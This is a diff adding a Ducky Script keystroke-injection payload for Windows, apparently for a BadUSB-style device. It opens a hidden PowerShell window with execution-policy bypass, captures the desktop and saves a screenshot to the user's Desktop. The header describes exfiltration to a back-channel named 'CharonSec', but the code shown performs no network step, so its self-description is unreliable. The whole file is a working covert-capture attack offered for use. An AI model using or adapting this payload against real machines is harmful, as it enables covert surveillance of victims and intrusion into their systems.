@@ -1,0 +1,17 @@
+REM ============================================================
+REM  Windows · Screenshot + Exfiltrate via Back-Channel
+REM ============================================================
+REM  Takes a screenshot of the host desktop and saves it. If
+REM  the back-channel is active, starts the full screen feed
+REM  to CharonSec. Otherwise just saves a single screenshot.
+REM
+REM  No external tools needed — uses .NET built-ins.
+
+DEFAULTDELAY 60
+
+GUI r
+DELAY 700
+STRING powershell -w hidden -ep bypass
+ENTER
+DELAY 1500
+STRINGLN Add-Type -AssemblyName System.Windows.Forms,System.Drawing;$b=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds;$bmp=New-Object Drawing.Bitmap($b.Width,$b.Height);$g=[Drawing.Graphics]::FromImage($bmp);$g.CopyFromScreen($b.Location,[Drawing.Point]::Empty,$b.Size);$bmp.Save("$env:USERPROFILE\Desktop\screenshot.png");$g.Dispose();$bmp.Dispose();exit
